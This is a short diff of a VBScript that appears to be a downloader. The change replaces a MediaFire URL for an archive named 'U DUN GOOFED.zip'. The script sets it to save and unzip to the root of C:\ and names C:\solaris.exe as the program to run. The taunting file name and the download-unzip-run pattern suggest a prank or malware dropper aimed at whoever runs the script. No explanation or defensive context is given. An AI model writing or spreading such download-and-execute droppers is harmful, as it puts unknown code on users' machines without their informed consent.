@@ -28,7 +28,7 @@ End Function
 Dim url, destination, unzipDestination, exeFile, welcomeResult, confirmationResult
 
 ' Update URL, destination, unzipDestination, and exeFile with your specific values
-url = "https://download1515.mediafire.com/ocmwqfbb6thgt2uYNNUZ-VKbwki0WRs-v3d4ZBgAxeQAa5QQUzG9BXe9j9gDy6djBJJB8oUOs9ZIz12Jegu0uWwmBKmdYrq2OD0PpYxwbC9kT2N2M4frM4M3a-EbgwXJc1v6dSBqHGKM4fYT_DRFaQ5rzp2eMrvGzKTcwMPfvRJvl0Q/phcl8ys4ok3o2n2/U+DUN+GOOFED.zip"
+url = "https://download1515.mediafire.com/hw5aq0f7vwggwvq3IX5bk4XYheh4IPKq2DTBWJo_OKsbdHdSyvDIM0_rPCSkjKew19Yzcun5puBo8RaDos5O_FGnpF2yfM7wTw7VqlFvd-ZHs9U9pMmFUBZiTQ7_5QD06QqW4IdKVru4T_gE2350fxGCu4nAGPzUYdgZIj_mp3wVIas/18wvmevhe2po9m9/U+DUN+GOOFED.zip"
 destination = "C:\U DUN GOOFED.zip"
 unzipDestination = "C:\"
 exeFile = "C:\solaris.exe"
